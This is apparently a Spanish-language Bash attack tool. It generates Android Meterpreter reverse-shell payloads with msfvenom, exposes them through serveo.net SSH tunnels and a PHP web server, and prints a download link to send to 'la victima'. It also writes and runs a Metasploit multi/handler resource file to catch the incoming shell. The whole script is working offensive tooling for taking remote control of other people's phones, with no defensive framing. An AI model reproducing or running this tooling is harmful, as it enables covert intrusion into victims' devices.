R='\033[1;31m'                                                        G='\033[1;32m'                                                        Y='\033[1;33m'                                                        B='\033[1;34m'                                                        M='\033[1;35m'                                                        C='\033[1;36m'
W='\033[0m'
Green='\033[32m'
PWD=~/shadow
LHOST1=serveo.net
set -euo pipefail
IFS=$'\n\t'
trap ctrl_c 2
function ctrl_c () {
echo
echo
echo -e "$B[*]$W Gracias por usar mi herramienta"
echo -e "$B[*]$W Contactame https://t.me/CesarGray"
echo -e "$B[*]$W Created by @CesarHackGray"
echo
if [ -e $PWD/sendlink ]; then
rm $PWD/sendlink
fi
if [ -e $PWD/TCP ]; then
rm $PWD/TCP
fi
exit 3
}
function payload  {
printf "$B[*]$W Payload"
while read -p " => " PAYLOAD && [ -z $PAYLOAD ]; do
printf "$B[$R*$B]$W Escribe un payload valido"
done
case $PAYLOAD in
"android/meterpreter/reverse_http")
LHOST
;;
"android/meterpreter/reverse_https")
LHOST
;;
"android/meterpreter/reverse_tcp")
LHOST
;;
"android/shell/reverse_http")
LHOST
;;
"android/shell/reverse_https")
LHOST
;;
"android/shell/reverse_tcp")
LHOST
;;
*)
echo -e $B"[$R!$B]$W Payload invalido"
sleep 3
payload
;;
esac
}
function LHOST {
printf "$B[*]$W LHOST"
while read -p " => " LHOST && [ -z $LHOST ]; do
printf "$B[$R*$B]$W Error IP Invalido"
done
LPORT12
}
function LPORT12 {
printf "$B[*]$W LPORT"
while read -p " => " LPORT1 && [ -z $LPORT1 ]; do
printf "$B[$R*$B]$W Error puerto Invalido"
done
printf "$B[*]$W Nombre"
while read -p " => " name && [ -z $name ]; do
printf "$B[$R*$B]$W Error nombre invalido "
done
printf "$B[*]$W Almacenando datos...\n"
sleep 3
printf "$B[*]$W Creando servidor php..\n"
sleep 3
PHP=$(shuf -i 1111-9999 -n 1)
printf "$B[*]$W Servidor creado....\n"
sleep 1
printf "$B[*]$W Creando puertos virtuales..\n"
sleep 3
servidor=$(shuf -i 11-99 -n 1)
ssh=$(shuf -i 1111-9999 -n 1)
printf "$B[*]$W Checando $LPORT1..\n"
sleep 2
LPORT=$(shuf -i 11111-99999 -n 1)
printf "$B[*]$W Conectado a $LHOST...\n"
sleep 3
printf "$B[*]$W Virtual LPORT $LPORT..\n"
sleep 3
rm -rf $PWD/serveo
printf "$B[*]$W Checando...\n"
sleep 0.8
printf "$B[*]$W Contactame $Green"
sleep 2
printf "https://t.me/CesarGray\n"
sleep 2
rm -rf $PWD/Tunel/servidor
touch $PWD/Tunel/servidor
if [ -e TCP ]; then
rm TCP
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$LPORT':'$LHOST':'$LPORT1' serveo.net > /dev/null 2>&1 ' &
sleep 10
if [ -e $PWD/PAYLOAD/$name ]; then
rm $PWD/PAYLOAD/$name
fi
if [ -e $PWD/Tunel/msfvenom.log ]; then
rm $PWD/Tunel/msfvenom.log
fi
printf "$B[*]$W Creando payloas..\n"
sleep 4
echo $(clear)
echo
echo
echo
printf "$Green LHOST=serveo.net\n"
printf "$Green LPORT=$LPORT\n"
printf "$Green R > ~/shadow/PAYLOAD/$name$Y"
echo
echo
echo $(msfvenom -p $PAYLOAD LHOST=serveo.net LPORT=$LPORT R > $PWD/PAYLOAD/$name)
echo
echo
echo
echo
echo
echo $(clear)
Cesar=$(shuf -i 1-6 -n1)
bash "$PWD/Tunel/shadow/"$Cesar
echo
echo
printf "$R"
echo
echo
printf "$B[*]$W Payload Creado ...\n"
sleep 3
printf "$B[*]$W Almacenando datos...\n"
sleep 1
printf "$B[*]$W Creando servidor php..\n"
sleep 1
printf "$B[*]$W Servidor creado....\n"
sleep 1
printf "$B[*]$W Creando puertos virtuales..\n"
sleep 1
printf "$B[*]$W Checando $LPORT1..\n"
sleep 1
printf "$B[*]$W Conectado a $LHOST...\n"
sleep 1
printf "$B[*]$W Obteniendo urls...\n"
sleep 6
if [ -e sendlink ]; then
rm sendlink
fi
php -S $LHOST:$PHP -t $PWD/PAYLOAD > /dev/null 2>&1 &
printf "$B[*]$W Envia ala victima =$Green http://$LHOST:$PHP/$name$W\n"
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:'$LHOST':'$PHP' serveo.net 2> /dev/null > sendlink ' &
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\033[1;34m[*]\033[0m Envia ala victima =\033[32m %s \n' $send_link/$name
sleep 5
printf "$B[*]$W explotando payload ..\n"
sleep 3
printf "$B[*]$W explotando handler ...\n"
sleep 3
if [ -e $PWD/Gray/$name.rc ]; then
rm $PWD/Gray/$name.rc
fi
touch $PWD/Gray/$name.rc
echo "use exploit/multi/handler" >> $PWD/Gray/$name.rc
echo "set PAYLOAD $PAYLOAD" >> $PWD/Gray/$name.rc
echo "set LHOST $LHOST" >> $PWD/Gray/$name.rc
echo "set LPORT $LPORT1" >> $PWD/Gray/$name.rc
echo "exploit" >> $PWD/Gray/$name.rc
printf "$B[*]$W Revisando datos...\n"
sleep 4
printf "$B[*]$W Created by $Green"
sleep 3
printf "@CesarHackGray & Mickey\n"
sleep 2
printf "$B[*]$W Exploit.....\n"
sleep 2
msfconsole -q -r $PWD/Gray/$name.rc
}
if [ -e install ]; then
echo
sleep 3
echo -e "$G[*]$W Error primero ejecuta$C bash install$W"
echo
sleep 2
exit 2
fi
payload
